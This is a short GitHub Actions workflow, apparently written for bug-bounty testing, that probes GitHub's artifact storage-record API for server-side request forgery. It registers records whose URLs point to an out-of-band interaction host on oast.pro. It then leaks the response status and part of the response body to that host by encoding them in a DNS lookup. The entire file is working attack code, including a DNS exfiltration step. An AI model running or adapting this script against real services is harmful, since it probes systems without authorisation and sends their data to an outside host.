name: urlfetch
on:
  workflow_dispatch:
permissions:
  contents: read
  artifact-metadata: write
jobs:
  u:
    runs-on: ubuntu-latest
    steps:
      - name: storage record with attacker URLs
        env:
          TOKEN: ${{ github.token }}
        run: |
          A="Authorization: Bearer $TOKEN"
          H="Accept: application/vnd.github+json"
          DIG=sha256:1111111111111111111111111111111111111111111111111111111111111111
          R1=$(curl -s -o /tmp/r1.json -w '%{http_code}' -X POST -H "$A" -H "$H"             https://api.github.com/orgs/tooforg/artifacts/metadata/storage-record             -d '{"name":"h1-urlprobe","digest":"'$DIG'","registry_url":"http://ro4yhyiy8bnjaqqlmuqbo1owp59d3uwp9.oast.pro/reg","artifact_url":"http://ro4yhyiy8bnjaqqlmuqbo1owp59d3uwp9.oast.pro/art","repository":"h1repo","github_repository":"public-test-repo"}')
          BS=$(tr -dc 'a-zA-Z0-9' < /tmp/r1.json | head -c 24)
          getent hosts "s${R1}x${BS}.ro4yhyiy8bnjaqqlmuqbo1owp59d3uwp9.oast.pro" > /dev/null 2>&1 || true
